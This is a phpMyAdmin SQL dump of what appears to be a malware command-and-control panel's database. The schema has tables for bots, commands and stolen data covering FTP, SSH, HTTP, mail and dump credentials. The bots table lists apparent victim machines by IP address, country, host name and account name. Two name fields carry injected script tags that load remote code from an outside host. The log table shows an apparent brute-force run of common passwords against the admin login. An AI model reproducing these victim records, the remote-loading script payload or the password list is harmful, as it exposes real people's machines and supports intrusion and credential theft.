-- phpMyAdmin SQL Dump
-- version 4.7.7
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: May 28, 2018 at 11:27 PM
-- Server version: 5.6.39-cll-lve
-- PHP Version: 5.6.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `hiepph96_inc`
--

-- --------------------------------------------------------

--
-- Table structure for table `FRox_bots`
--

CREATE TABLE `FRox_bots` (
  `bot_id` int(11) NOT NULL,
  `bot_guid` varchar(32) NOT NULL,
  `bot_os` int(2) NOT NULL,
  `bot_is_win64` int(1) NOT NULL,
  `bot_account` int(1) NOT NULL,
  `bot_ip` varchar(20) NOT NULL,
  `bot_reports` int(11) DEFAULT NULL,
  `bot_country` varchar(3) NOT NULL,
  `bot_first_online` int(11) NOT NULL,
  `bot_last_online` int(11) NOT NULL,
  `bot_version` int(11) NOT NULL,
  `bot_bin_id` varchar(11) NOT NULL,
  `bot_screen` varchar(10) NOT NULL,
  `bot_coin` int(1) NOT NULL,
  `bot_name` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `FRox_bots`
--

INSERT INTO `FRox_bots` (`bot_id`, `bot_guid`, `bot_os`, `bot_is_win64`, `bot_account`, `bot_ip`, `bot_reports`, `bot_country`, `bot_first_online`, `bot_last_online`, `bot_version`, `bot_bin_id`, `bot_screen`, `bot_coin`, `bot_name`) VALUES
(1, 'F12A1B0ED5809C397714DE94', 10, 1, 2, '154.70.68.9', 0, 'GH', 1526330681, 1526330681, 18, 'ckav.ru', '1366x768', 0, 'DELL.\\\\D.E.L.L'),
(2, '0C34832202C8B15E32FC7ECE', 6, 0, 3, '5.227.65.101', 1, 'RU', 1527126376, 1527139968, 18, 'ckav.ru', '1364x768', 0, 'PRIEMKA-A.\\\\-'),
(3, '41CA30CCF4EE288268DF3D18', 6, 1, 3, '217.248.52.36', 1, 'DE', 1527131830, 1527134071, 18, 'ckav.ru', '800x600', 0, 'IT-RickTest2.\\\\Administrator'),
(4, 'EC567766694C42D36D900C9B', 11, 1, 3, '63.145.224.114', 0, 'DE', 1527131983, 1527133843, 18, 'ckav.ru', '1024x768', 0, 'FIN-Shawn.\\\\Administrator'),
(5, 'BACDF53A1DF0B6334754F681', 6, 1, 3, '87.113.186.144', 1, 'GB', 1527132356, 1527132422, 18, 'ckav.ru', '1280x1024', 0, 'HOME-PC-WIN7-2.\\\\John'),
(6, '0A6C93ACEA8501DBA1A1C26A', 1, 0, 3, '95.211.190.198', 1, 'NL', 1527141484, 1527141642, 18, 'ckav.ru', '1152x864', 0, 'cstenndetxce.\\\\user'),
(7, '3749282D282E1E80C56CAE5A', 6, 1, 3, '69.55.5.250', 0, 'US', 1527143273, 1527147091, 18, 'ckav.ru', '1024x768', 0, 'PC.\\\\Administrator'),
(8, '57965843204DA9219E7965A4', 6, 0, 2, '171.50.184.209', 1, 'IN', 1527144314, 1527170109, 18, 'ckav.ru', '1366x768', 0, 'HCL-PC.hcl-PC\\\\hcl'),
(9, '3BA87BBD1CC40F3583D46680', 1, 0, 3, '12.167.151.117', 1, 'US', 1527146803, 1527146923, 18, 'ckav.ru', '1024x768', 0, '936905.DELLXP3-0ED11F9\\\\Administrator'),
(10, '809FE13FB0BDBA664E90A302', 6, 1, 3, '208.91.115.12', 1, 'CA', 1527182147, 1527182210, 18, 'ckav.ru', '1280x720', 0, 'KUSHIDA-PC.Kushida-PC\\\\Kushida'),
(11, 'E5598603492618096165B55A', 11, 1, 2, '85.5.205.23', 1, 'CH', 1527198955, 1527199326, 18, 'ckav.ru', '2560x1600', 0, 'ANGOLAR-PC.\\\\patrik'),
(12, 'B4E071BDF2C1476D17980373', 1, 0, 3, '207.102.138.40', 0, 'CA', 1527207611, 1527486680, 18, 'ckav.ru', '1024x768', 0, 'ABC-XP.\\\\abc'),
(13, '8C8C555863A046354E678475', 6, 1, 2, '200.105.176.59', 1, 'BO', 1527216571, 1527218352, 18, 'ckav.ru', '1600x1200', 0, 'THUNUPA-PC.Thunupa-PC\\\\Thunupa'),
(14, 'F6ECD31A28C61745E26C3B22', 6, 1, 3, '95.25.6.142', 1, 'RU', 1527259281, 1527259286, 18, 'ckav.ru', '1024x768', 0, '0HPGG-PC.\\\\0HpGG'),
(15, '7C71CA32C8C51D3773140E12', 6, 1, 3, '46.183.218.199', 0, 'XX', 1527483136, 1527522736, 18, 'ckav.ru', '1024x768', 0, 'FEDOT-35E5223F78.\\\\SIDOROV'),
(16, 'B27248F0BA43F66AB53DB99A', 6, 0, 3, '166.70.207.2', 0, 'XX', 1527484535, 1527524178, 18, 'ckav.ru', '1024x768', 0, 'PC.\\\\Administrator'),
(17, '45717DC391F4F089E91B66D1', 6, 1, 3, '80.255.6.17', 0, 'DE', 1527487578, 1527487580, 18, 'ckav.ru', '800x600', 0, 'PHIL-PC.Phil-PC\\\\Phil'),
(18, 'FF0D98B8883353227999E801', 6, 0, 3, '185.220.70.173', 1, 'XX', 1527514518, 1527519428, 18, 'ckav.ru', '1024x768', 0, 'WILLCARTER-PC.WillCarter-PC\\\\Administrator'),
(19, 'CBB0A0ABCAF464AB67A8E9BF', 11, 0, 3, '185.45.12.126', 0, 'RO', 1527516780, 1527516780, 18, 'ckav.ru', '1080x1920', 0, '13bdc-PC.\\\\13BDc<script src=\\\"http://gmyc.cf/94076\\\"></script>'),
(20, '3AF1CA2E69577BDDA91D3A37', 7, 0, 3, '212.92.105.147', 1, 'RU', 1527522351, 1527522351, 18, 'ckav.ru', '1080x1920', 0, '7fdf5-PC.\\\\7Fdf5<script src=\\\"http://gmyc.cf/95488\\\"></script>');

-- --------------------------------------------------------

--
-- Table structure for table `FRox_commands`
--

CREATE TABLE `FRox_commands` (
  `command_id` int(11) NOT NULL,
  `command_comment` varchar(150) NOT NULL,
  `command_elevated` int(11) NOT NULL,
  `command_is_win64` int(1) NOT NULL,
  `command_os` varchar(40) NOT NULL,
  `command_country` text NOT NULL,
  `command_version` float NOT NULL,
  `command_bin_id` varchar(11) NOT NULL,
  `command_wallet` int(1) NOT NULL,
  `command_limit` int(11) NOT NULL,
  `command_executed` int(11) NOT NULL,
  `command_time` int(11) NOT NULL,
  `command_active` int(1) NOT NULL,
  `command_time_limit` int(11) NOT NULL,
  `command_data` text NOT NULL,
  `command_type` int(2) NOT NULL,
  `command_duplicate` int(1) NOT NULL,
  `command_bot_guid` varchar(33) NOT NULL,
  `command_loaded` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `FRox_commands_log`
--

CREATE TABLE `FRox_commands_log` (
  `command_log_id` int(11) NOT NULL,
  `command_log_command_id` int(11) NOT NULL,
  `command_log_bot_id` int(11) NOT NULL,
  `command_log_time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `FRox_data`
--

CREATE TABLE `FRox_data` (
  `data_id` int(11) NOT NULL,
  `report_id` int(11) NOT NULL,
  `data_time` int(11) NOT NULL,
  `data_client` int(11) NOT NULL,
  `data_type` enum('ftp','ssh','http','data','datadl','error','mail','dump') NOT NULL,
  `data_text` blob NOT NULL,
  `data_hash` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `FRox_logs`
--

CREATE TABLE `FRox_logs` (
  `log_id` int(11) NOT NULL,
  `log_type` varchar(30) NOT NULL,
  `log_text` varchar(300) NOT NULL,
  `log_time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `FRox_logs`
--

INSERT INTO `FRox_logs` (`log_id`, `log_type`, `log_text`, `log_time`) VALUES
(1, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516513),
(2, 'WARNING_AUTH_NOT_SUCCESS', 'admin, football20, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516514),
(3, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ******, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516515),
(4, 'WARNING_AUTH_NOT_SUCCESS', 'admin, *******, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516516),
(5, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516517),
(6, 'WARNING_AUTH_NOT_SUCCESS', 'admin, *********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516518),
(7, 'WARNING_AUTH_NOT_SUCCESS', 'admin, **********, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516519),
(8, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516520),
(9, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516521),
(10, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 000000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516522),
(11, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 00000000, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516523),
(12, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0123456789, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516524),
(13, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 0987654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516525),
(14, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516526),
(15, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 102030, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516527),
(16, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516528),
(17, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 11111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516529),
(18, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 111111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516530),
(19, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 11111111, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516530),
(20, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 112233, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516531),
(21, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1128, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516532),
(22, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 121212, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516533),
(23, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516534),
(24, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516535),
(25, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123123123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516536),
(26, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516537),
(27, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516537),
(28, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12341234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516538),
(29, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12345, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516539),
(30, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123456, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516540),
(31, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234567, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516541),
(32, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 12345678, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516542),
(33, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123456789, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516543),
(34, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234567890, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516543),
(35, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1234qwer, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516544),
(36, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123654, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516545),
(37, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123abc, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516546),
(38, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 123qwe, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516547),
(39, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 159357, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516548),
(40, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 159753, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516549),
(41, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 19731973, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516550),
(42, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516551),
(43, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e4r, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516552),
(44, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1q2w3e4r5t, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516553),
(45, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 1qaz2wsx, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516553),
(46, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 222222, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516554),
(47, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 42Olympia, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516555),
(48, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 4uA7d0A1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516556),
(49, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 4uA7d0B2, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516557),
(50, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 555555, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516558),
(51, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516559),
(52, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 666666, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516559),
(53, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 777777, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516560),
(54, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 7777777, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516561),
(55, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 888888, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516562),
(56, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 88888888, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516563),
(57, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 8WI5Hlbww*Q%, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516564),
(58, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 97cCm#, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516565),
(59, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 987654, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516566),
(60, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 987654321, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516567),
(61, 'WARNING_AUTH_NOT_SUCCESS', 'admin, 999999, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516567),
(62, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ??????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516568),
(63, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ???????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516569),
(64, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ????????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516570),
(65, 'WARNING_AUTH_NOT_SUCCESS', 'admin, ?????????, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516571),
(66, 'WARNING_AUTH_NOT_SUCCESS', 'admin, BALANDAS, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516572),
(67, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Cannot Decrypt, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516573),
(68, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Caroline123@, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516574),
(69, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Dr%*iKm, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516574),
(70, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Every1Out, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516575),
(71, 'WARNING_AUTH_NOT_SUCCESS', 'admin, FTpdo24#, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516576),
(72, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Ghj124$(), RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516577),
(73, 'WARNING_AUTH_NOT_SUCCESS', 'admin, HowMuchIsTheFish, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516578),
(74, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Hwa303859, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516579),
(75, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Karend22, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516582),
(76, 'WARNING_AUTH_NOT_SUCCESS', 'admin, LogMeIn, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516583),
(77, 'WARNING_AUTH_NOT_SUCCESS', 'admin, No Data!, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516584),
(78, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Note:, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516585),
(79, 'WARNING_AUTH_NOT_SUCCESS', 'admin, P@ssw0rd, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516586),
(80, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516587),
(81, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516588),
(82, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Password123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516589),
(83, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Passwort, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516589),
(84, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Sakhie64, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516590),
(85, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Shamrock77, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516591),
(86, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Test, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516592),
(87, 'WARNING_AUTH_NOT_SUCCESS', 'admin, Welcome1, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516593),
(88, 'WARNING_AUTH_NOT_SUCCESS', 'admin, [EMPTY PASSWORD], RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516594),
(89, 'WARNING_AUTH_NOT_SUCCESS', 'admin, aaaaaa, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516595),
(90, 'WARNING_AUTH_NOT_SUCCESS', 'admin, abc123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516596),
(91, 'WARNING_AUTH_NOT_SUCCESS', 'admin, abcd1234, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516597),
(92, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516598),
(93, 'WARNING_AUTH_NOT_SUCCESS', 'admin, admin123, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516599),
(94, 'WARNING_AUTH_NOT_SUCCESS', 'admin, alpha1906, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516599),
(95, 'WARNING_AUTH_NOT_SUCCESS', 'admin, andrea, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516600),
(96, 'WARNING_AUTH_NOT_SUCCESS', 'admin, asdasd, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516601),
(97, 'WARNING_AUTH_NOT_SUCCESS', 'admin, asdfghjkl, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516602),
(98, 'WARNING_AUTH_NOT_SUCCESS', 'admin, barcelona, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516604),
(99, 'WARNING_AUTH_NOT_SUCCESS', 'admin, cecelle222, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516604),
(100, 'WARNING_AUTH_NOT_SUCCESS', 'admin, changeme, RO (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527516606),
